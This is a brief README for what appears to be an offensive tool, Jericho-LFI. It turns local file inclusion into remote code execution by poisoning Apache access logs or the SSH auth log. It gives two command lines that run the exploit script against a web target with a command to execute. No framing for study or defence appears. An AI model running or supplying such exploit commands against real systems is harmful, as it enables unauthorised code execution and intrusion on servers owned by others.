# Jericho-LFI
Local file inclusion to log injection to RCE

Usage

Apache log poisoning:

```
python3 log_injection.py "http://localhost/" "apache" --parameter=page --cmd=id
```

SSH log poisoning:

```
python3 log_injection.py "http://localhost" "ssh" --ip=0.0.0.0 --port=9001 --cmd=id --filename=/var/log/auth.log
```
